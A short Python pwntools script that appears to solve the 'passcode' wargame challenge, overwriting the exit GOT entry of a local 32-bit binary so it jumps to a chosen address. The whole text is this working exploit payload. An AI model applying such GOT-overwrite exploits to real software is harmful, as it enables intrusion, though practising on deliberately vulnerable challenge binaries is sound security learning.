from pwn import *
import os

context.arch = 'i386'
context.os   = 'linux'
context.bits = 32

elf = ELF('passcode')
shellAddr = 0x080485e3

payload = "A"*96 + p32(elf.got['exit']) + str(shellAddr)
os.system("echo '"+ payload +"' | ./passcode")
